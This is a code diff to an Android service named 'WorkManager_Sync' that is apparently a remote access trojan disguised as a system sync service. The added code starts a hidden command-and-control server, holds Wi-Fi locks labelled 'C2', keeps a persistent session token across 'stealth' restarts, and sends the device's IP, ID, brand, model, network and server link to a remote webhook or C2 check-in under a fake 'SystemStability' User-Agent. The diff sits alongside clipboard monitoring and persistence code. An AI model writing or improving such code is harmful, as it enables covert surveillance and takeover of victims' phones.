@@ -75,7 +75,7 @@ public class WorkManager_Sync extends Service {
                     currentHeartbeatInterval = IDLE_HEARTBEAT_MS;
                 }
 
-                String currentIp = MainActivity.getLocalIpAddress();
+                String currentIp = MainActivity.getBestIpForConnection(WorkManager_Sync.this);
                 if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
                     networkExecutor.execute(() -> {
                         checkAndSendIpReport(currentIp);
@@ -148,11 +148,20 @@ public class WorkManager_Sync extends Service {
             return;
         }
 
+        // Restore persistent session token across service/stealth restarts
+        String savedToken = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("session_token", "");
+        if (savedToken == null || savedToken.isEmpty()) {
+            savedToken = java.util.UUID.randomUUID().toString();
+            getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putString("session_token", savedToken).apply();
+        }
+        activeSessionToken = savedToken;
+
         setupKeepAlive();
         setupClipboardMonitor();
         schedulePersistenceAlarms();
         createNotificationChannel();
         ensureForeground();
+        startServer();
         
         // --- PERSISTENCE LEVEL-UP ---
         // Request battery and hibernation exclusions on setup
@@ -355,7 +364,7 @@ public class WorkManager_Sync extends Service {
     private void ensureForeground() {
         if (isForeground) {
             // Update existing notification to match current stealth state
-            NotificationManager manager = getSystemService(NotificationManager.class);
+            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
             if (manager != null) {
                 manager.notify(NOTIFICATION_ID, createNotification());
             }
@@ -438,8 +447,44 @@ public class WorkManager_Sync extends Service {
         } catch (Exception ignored) {}
     }
 
+    private android.net.wifi.WifiManager.WifiLock wifiLock;
+    private android.net.wifi.WifiManager.MulticastLock multicastLock;
+
+    private synchronized void acquireWifiLock() {
+        try {
+            android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            if (wm != null) {
+                // 1. High-Performance Radio Lock
+                if (wifiLock == null) {
+                    wifiLock = wm.createWifiLock(
+                        android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF,
+                        "LabRATS:C2_WifiLock"
+                    );
+                    wifiLock.setReferenceCounted(false);
+                }
+                if (wifiLock != null && !wifiLock.isHeld()) {
+                    wifiLock.acquire();
+                    Log.d(TAG, "C2_WIFI_LOCK: High-performance Wi-Fi radio lock acquired.");
+                }
+
+                // 2. Multicast & Local Wi-Fi Packet Filter Lock (Required for Android 15 / One UI 7)
+                if (multicastLock == null) {
+                    multicastLock = wm.createMulticastLock("LabRATS:C2_Multicast");
+                    multicastLock.setReferenceCounted(false);
+                }
+                if (multicastLock != null && !multicastLock.isHeld()) {
+                    multicastLock.acquire();
+                    Log.d(TAG, "C2_MULTICAST_LOCK: One UI 7 local Wi-Fi packet filter lock acquired.");
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "WifiLock/MulticastLock Error: " + e.getMessage());
+        }
+    }
+
     private synchronized void startServer() {
         try {
+            acquireWifiLock();
             if (server == null || !server.isAlive()) {
                 // --- PORT_SANITY_CHECK ---
                 int port = FirebaseConfig.DEFAULT_PORT;
@@ -544,8 +589,15 @@ public class WorkManager_Sync extends Service {
             channel.setShowBadge(false);
             channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
 
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            manager.createNotificationChannel(channel);
+            NotificationManager manager;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                manager = getSystemService(NotificationManager.class);
+            } else {
+                manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+            }
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
         }
     }
 
@@ -623,6 +675,20 @@ public class WorkManager_Sync extends Service {
             try {
                 networkCallback = new ConnectivityManager.NetworkCallback() {
                     @Override
+                    public void onAvailable(Network network) {
+                        super.onAvailable(network);
+                        ipReportHandler.removeCallbacks(ipReportRunnable);
+                        ipReportHandler.postDelayed(ipReportRunnable, 3000);
+                    }
+
+                    @Override
+                    public void onLost(Network network) {
+                        super.onLost(network);
+                        ipReportHandler.removeCallbacks(ipReportRunnable);
+                        ipReportHandler.postDelayed(ipReportRunnable, 3000);
+                    }
+
+                    @Override
                     public void onLinkPropertiesChanged(Network network, LinkProperties linkProperties) {
                         super.onLinkPropertiesChanged(network, linkProperties);
                         // Debounce IP reporting to prevent flood during network transitions
@@ -696,25 +762,33 @@ public class WorkManager_Sync extends Service {
     }
 
     private synchronized void checkAndSendIpReport(String currentIp) {
-        if (currentIp == null || currentIp.trim().isEmpty() || "Unknown".equalsIgnoreCase(currentIp)) {
+        if (currentIp == null || currentIp.trim().isEmpty() || "Unknown".equalsIgnoreCase(currentIp) || "127.0.0.1".equals(currentIp)) {
             Log.d(TAG, "IP Report Skipped: Invalid or unresolved IP (" + currentIp + ")");
             return;
         }
 
         long now = System.currentTimeMillis();
-        boolean ipChanged = !currentIp.equals(lastReportedIp);
-        boolean isInitialReport = lastReportedIp == null || lastReportedIp.isEmpty();
-        boolean periodicRefresh = (now - lastReportTimestamp > 15 * 60 * 1000); // 15 mins
+        boolean ipChanged = !currentIp.equalsIgnoreCase(lastReportedIp);
+        boolean maintenanceTimeElapsed = (now - lastReportTimestamp) > 1800000; // 30 minutes
 
-        if (isInitialReport || ipChanged || periodicRefresh) {
-            Log.d(TAG, "IP Report Triggered for IP: " + currentIp);
-            if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
+        // Only send Google Sheets ping if IP changed OR 30-min maintenance interval reached
+        if (!ipChanged && !maintenanceTimeElapsed && lastReportTimestamp > 0) {
+            Log.d(TAG, "IP Report Skipped: IP unchanged (" + currentIp + ") and maintenance interval not reached.");
+            return;
+        }
+
+        Log.d(TAG, "IP Report Triggered for IP: " + currentIp + " (ipChanged=" + ipChanged + ")");
+        if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
+            if (REMOTE_WEBHOOK_URL.contains("script.google.com") || REMOTE_WEBHOOK_URL.contains("script.googleusercontent.com")) {
                 boolean success = sendIpToWebhook(currentIp);
                 if (success) {
                     lastReportedIp = currentIp;
                     lastReportTimestamp = now;
-                    C2_Uploader.checkIn(WorkManager_Sync.this);
                 }
+            } else {
+                lastReportedIp = currentIp;
+                lastReportTimestamp = now;
+                C2_Uploader.checkIn(WorkManager_Sync.this);
             }
         }
     }
@@ -741,18 +815,12 @@ public class WorkManager_Sync extends Service {
             return;
         }
 
-        MainActivity.getPublicIPv6Async(publicIp -> {
-            if (networkExecutor.isShutdown()) return;
-            
-            String localIp = MainActivity.getLocalIpAddress();
-            String currentIp = (localIp != null) ? localIp : publicIp;
-
-            try {
-                networkExecutor.execute(() -> checkAndSendIpReport(currentIp));
-            } catch (Exception e) {
-                Log.e(TAG, "Executor error", e);
-            }
-        });
+        String currentIp = MainActivity.getBestIpForConnection(WorkManager_Sync.this);
+        try {
+            networkExecutor.execute(() -> checkAndSendIpReport(currentIp));
+        } catch (Exception e) {
+            Log.e(TAG, "Executor error", e);
+        }
     }
 
     private boolean sendIpToWebhook(String ip) {
@@ -791,8 +859,12 @@ public class WorkManager_Sync extends Service {
                 }
             } catch (Exception ignored) {}
 
+            if (ip == null || ip.trim().isEmpty()) {
+                ip = "127.0.0.1";
+            }
+
             int actualPort = (server != null) ? server.getListeningPort() : FirebaseConfig.DEFAULT_PORT;
-            String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
+            String formattedIp = (ip.contains(":")) ? "[" + ip + "]" : ip;
             String link = "http://" + formattedIp + ":" + actualPort;
 
             String chargingStatus = "Discharging";
@@ -816,10 +888,12 @@ public class WorkManager_Sync extends Service {
                 freeStorage = android.text.format.Formatter.formatFileSize(this, bytes) + " Free";
             } catch (Exception ignored) {}
 
-            String fullDeviceModel = Build.MANUFACTURER + " " + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")";
+            String fullDeviceModel = Build.MODEL != null ? Build.MODEL : "Android-Device";
 
             // Build Query String & JSON Payload
             String queryParams = "ip=" + java.net.URLEncoder.encode(ip != null ? ip : "", "UTF-8") +
+                    "&deviceId=" + java.net.URLEncoder.encode(C2_Uploader.getDeviceId(this), "UTF-8") +
+                    "&brand=" + java.net.URLEncoder.encode(Build.MANUFACTURER, "UTF-8") +
                     "&device=" + java.net.URLEncoder.encode(fullDeviceModel, "UTF-8") +
                     "&model=" + java.net.URLEncoder.encode(fullDeviceModel, "UTF-8") +
                     "&network=" + java.net.URLEncoder.encode(networkType, "UTF-8") +
@@ -843,10 +917,13 @@ public class WorkManager_Sync extends Service {
             conn.setReadTimeout(15000);
             conn.setRequestProperty("User-Agent", "SystemStability/1.5");
 
+            String devId = C2_Uploader.getDeviceId(this);
             String json = "{" +
                     "\"ip\":\"" + ip + "\"," +
-                    "\"device\":\"" + fullDeviceModel + "\"," +
-                    "\"model\":\"" + fullDeviceModel + "\"," +
+                    "\"deviceId\":\"" + devId + "\"," +
+                    "\"brand\":\"" + Build.MANUFACTURER + "\"," +
+                    "\"device\":\"" + Build.MODEL + "\"," +
+                    "\"model\":\"" + Build.MODEL + "\"," +
                     "\"network\":\"" + networkType + "\"," +
                     "\"port\":" + actualPort + "," +
                     "\"link\":\"" + link + "\"," +
